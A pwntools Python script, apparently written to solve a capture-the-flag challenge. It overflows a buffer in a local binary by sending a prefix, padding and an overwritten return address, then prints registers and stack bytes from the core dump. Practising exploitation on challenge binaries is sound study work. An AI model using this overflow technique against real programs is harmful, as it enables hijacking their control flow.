from pwn import *

# Start the process (locally)
context.binary = './ee896dc994ddac91ac5219d36dd9e3bd'
elf = context.binary

# Start the process (locally)
p = process(elf.path)
#p = remote('127.0.0.1', 55555)

#try:
print(p.recv().decode('utf-8'))

pretext = b"HuNtET"
payload = b"A" * (8880 - len(pretext))
payload += b"A" * 8
payload += p32(0x401319)

p.sendline(pretext+payload)
print(p.recv().decode('utf-8'))
    #p.send(b"a")
    #print(p.recv())
#except EOFError:
print("EOFError: Process crashed (Segmentation fault likely occurred)")

# Check if a core dump was generated and inspect it
if p.corefile:
    core = p.corefile

    # Print core dump details
    print(f"Segmentation Fault! Core Dump available.")

    # Print register values at the time of the crash
    print(f"RIP: {hex(core.rip)}")  # Instruction pointer
    print(f"RSP: {hex(core.rsp)}")  # Stack pointer
    print(f"RBP: {hex(core.rbp)}")  # Base pointer
    print(f"Registers: {core.registers}")

    # Optionally read memory from the core file (like the stack near RSP)
    crash_stack = core.read(core.rsp, 0x50)  # Read 50 bytes from RSP
    print(f"Stack memory near crash: {crash_stack.hex()}")

else:
    print("No core dump available to inspect.")
#finally:
p.close()  #